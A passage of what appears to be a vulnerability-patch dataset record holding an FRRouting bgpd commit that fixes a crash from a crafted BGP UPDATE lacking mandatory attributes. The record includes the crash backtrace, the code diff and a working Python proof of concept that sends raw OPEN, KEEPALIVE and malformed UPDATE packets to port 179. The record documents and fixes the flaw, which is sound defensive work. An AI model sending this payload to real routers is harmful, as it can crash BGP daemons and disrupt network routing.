        "message": "bgpd: Check mandatory attributes more carefully for UPDATE message\n\nIf we send a crafted BGP UPDATE message without mandatory attributes, we do\nnot check if the length of the path attributes is zero or not. We only check\nif attr->flag is at least set or not. Imagine we send only unknown transit\nattribute, then attr->flag is always 0. Also, this is true only if graceful-restart\ncapability is received.\n\nA crash:\n\n```\nbgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)\nbgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17\nBGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]\nBGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]\nBGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]\nBGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]\nBGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]\nBGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]\nBGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]\nBGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]\nBGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]\nBGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]\nBGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]\nBGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]\n```\n\nSending:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(1000)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/FRRouting/frr/pull/14645"
        ],
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3385: }",
          "3389: {",
          "3390:  uint8_t type = 0;",
          "3395:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Removed Lines]",
          "3388: static int bgp_attr_check(struct peer *peer, struct attr *attr)",
          "3394:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)",
          "",
          "[Added Lines]",
          "3388: static int bgp_attr_check(struct peer *peer, struct attr *attr,",
          "3389:      bgp_size_t length)",
          "3395:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3396:      !length)",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3443:  enum bgp_attr_parse_ret ret;",
          "3444:  uint8_t flag = 0;",
          "3445:  uint8_t type = 0;",
          "3447:  uint8_t *startp, *endp;",
          "3448:  uint8_t *attr_endp;",
          "3449:  uint8_t seen[BGP_ATTR_BITMAP_SIZE];",
          "",
          "[Removed Lines]",
          "3446:  bgp_size_t length;",
          "",
          "[Added Lines]",
          "3448:  bgp_size_t length = 0;",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "3831:  }",
          "3835:  if (ret < 0)",
          "3836:   goto done;",
          "",
          "[Removed Lines]",
          "3834:  ret = bgp_attr_check(peer, attr);",
          "",
          "[Added Lines]",
          "3836:  ret = bgp_attr_check(peer, attr, length);",
          "",
          "---------------"
        ]
      }
    }
  ]
}